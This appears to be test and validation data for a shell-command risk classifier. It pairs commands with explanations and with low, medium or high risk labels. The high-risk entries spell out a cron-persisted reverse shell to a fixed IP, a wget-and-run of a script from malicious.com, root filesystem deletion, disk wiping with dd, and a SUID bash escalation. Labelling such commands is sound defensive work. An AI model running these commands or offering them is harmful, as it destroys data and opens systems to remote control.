test_data = [
    {
        "command": "ps -ef",
        "explaination": "View detailed information of all system processes",
    },
    {
        "command": "df -h",
        "explaination": "Display file system disk usage in human - readable format",
    },
    {
        "command": "top",
        "explaination": "Real - time view of CPU, memory and other system resource usage",
    },
    {
        "command": "cat /etc/os - release",
        "explaination": "View Linux distribution version information",
    },
    {"command": "whoami", "explaination": "Display the currently logged - in username"},
    {
        "command": "chmod 777 /etc/nginx/nginx.conf",
        "explaination": "Set Nginx configuration file permissions to global read - write, which may expose sensitive configurations",
    },
    {
        "command": "systemctl restart mysql",
        "explaination": "Restart the MySQL service; unsynchronized data may cause temporary connection interruptions or data loss",
    },
    {
        "command": "sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config",
        "explaination": "Allow root remote SSH login, greatly increasing the brute - force attack surface",
    },
    {
        "command": "useradd testuser && passwd testuser",
        "explaination": "Create a system user and set a password; malicious exploitation may create privileged accounts",
    },
    {
        "command": "rm -rf /tmp/old_logs",
        "explaination": "Delete the old log directory under /tmp (assuming path safety), but incorrect paths may lead to high - risk accidental deletion",
    },
    {
        "command": "rm -rf / --no - preserve - root",
        "explaination": "Recursively delete all files in the root directory and directly destroy the operating system",
    },
    {
        "command": "echo 'bash -i >& /dev/tcp/192.168.1.100/8888 0>&1' >> /etc/crontab",
        "explaination": "Write reverse Shell commands to cron jobs, opening remote control channels",
    },
    {
        "command": "sudo su - && chmod u+s /bin/bash",
        "explaination": "Assign SUID privileges to bash, allowing any user to escalate privileges to root via bash",
    },
    {
        "command": "dd if=/dev/zero of=/dev/sda bs=1M",
        "explaination": "Write zero data to the system disk, permanently destroying disk partitions and file systems",
    },
    {
        "command": "wget http://malicious.com/malware.sh && bash malware.sh",
        "explaination": "Download and run malicious scripts, which may contain payloads like mining, ransomware, or backdoors",
    },
]

validate_data = [
    {"command": "ps -ef", "risk_level": "low"},
    {"command": "df -h", "risk_level": "low"},
    {"command": "top", "risk_level": "low"},
    {"command": "cat /etc/os - release", "risk_level": "low"},
    {"command": "whoami", "risk_level": "low"},
    {"command": "chmod 777 /etc/nginx/nginx.conf", "risk_level": "medium"},
    {"command": "systemctl restart mysql", "risk_level": "medium"},
    {
        "command": "sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config",
        "risk_level": "medium",
    },
    {"command": "useradd testuser && passwd testuser", "risk_level": "medium"},
    {"command": "rm -rf /tmp/old_logs", "risk_level": "medium"},
    {"command": "rm -rf / --no - preserve - root", "risk_level": "high"},
    {
        "command": "echo 'bash -i >& /dev/tcp/192.168.1.100/8888 0>&1' >> /etc/crontab",
        "risk_level": "high",
    },
    {"command": "sudo su - && chmod u+s /bin/bash", "risk_level": "high"},
    {"command": "dd if=/dev/zero of=/dev/sda bs=1M", "risk_level": "high"},
    {
        "command": "wget http://malicious.com/malware.sh && bash malware.sh",
        "risk_level": "high",
    },
]
